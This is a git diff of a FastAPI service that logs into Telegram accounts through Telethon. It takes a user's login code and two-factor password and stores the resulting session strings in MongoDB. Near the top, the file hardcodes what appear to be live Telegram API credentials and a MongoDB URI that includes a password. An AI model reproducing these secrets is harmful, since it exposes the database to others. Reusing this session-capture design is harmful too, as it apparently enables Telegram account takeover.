@@ -8,7 +8,7 @@ from motor.motor_asyncio import AsyncIOMotorClient
 
 app = FastAPI()
 
-# --- YOUR CREDENTIALS ---
+# --- CREDENTIALS ---
 API_ID = 36531006
 API_HASH = '8b4df3bdc80ff44b80a1d788d4e55eb2'
 MONGO_URI = "mongodb+srv://eternlxz516_db_user:1asJy8YrLKj4cL73@lunar.6ltkilo.mongodb.net/?appName=Lunar"
@@ -29,12 +29,13 @@ class VerifyRequest(BaseModel):
 
 @app.post("/send_code")
 async def send_code(req: PhoneRequest):
-    # We use a clean StringSession every time to avoid file conflicts on Vercel
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     await client.connect()
     try:
+        # Requesting the code
         sent_code = await client.send_code_request(req.phone)
-        # We MUST save the phone_code_hash, otherwise Verify will fail
+        
+        # WE MUST SAVE THIS HASH - This is why it was failing before
         await temp_auth.update_one(
             {"user_id": req.user_id},
             {"$set": {
@@ -44,6 +45,8 @@ async def send_code(req: PhoneRequest):
             upsert=True
         )
         return {"status": "success"}
+    except errors.FloodWaitError as e:
+        return {"status": "error", "message": f"Telegram Limit: Wait {e.seconds} seconds."}
     except Exception as e:
         return {"status": "error", "message": str(e)}
     finally:
@@ -51,16 +54,15 @@ async def send_code(req: PhoneRequest):
 
 @app.post("/verify")
 async def verify(req: VerifyRequest):
-    # 1. Fetch the data from the previous step
     auth_data = await temp_auth.find_one({"user_id": req.user_id})
     if not auth_data:
-        return {"status": "error", "message": "Session expired. Please request a new code."}
+        return {"status": "error", "message": "No active login found. Send code again."}
 
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     await client.connect()
     try:
         try:
-            # 2. You MUST include the phone_code_hash here
+            # SIGN IN USING THE HASH WE SAVED
             await client.sign_in(
                 phone=auth_data["phone"],
                 code=req.code,
@@ -71,21 +73,16 @@ async def verify(req: VerifyRequest):
                 return {"status": "2fa_required"}
             await client.sign_in(password=req.password)
 
-        # 3. If successful, save the string
         string_session = client.session.save()
         await final_sessions.update_one(
             {"user_id": req.user_id},
             {"$set": {"session": string_session, "phone": auth_data["phone"]}},
             upsert=True
         )
-        
-        # Cleanup temp data so it doesn't conflict later
         await temp_auth.delete_one({"user_id": req.user_id})
-        
         return {"status": "success"}
-    except errors.PhoneCodeExpiredError:
-        return {"status": "error", "message": "The code has expired. Try again."}
     except Exception as e:
         return {"status": "error", "message": str(e)}
     finally:
         await client.disconnect()
+
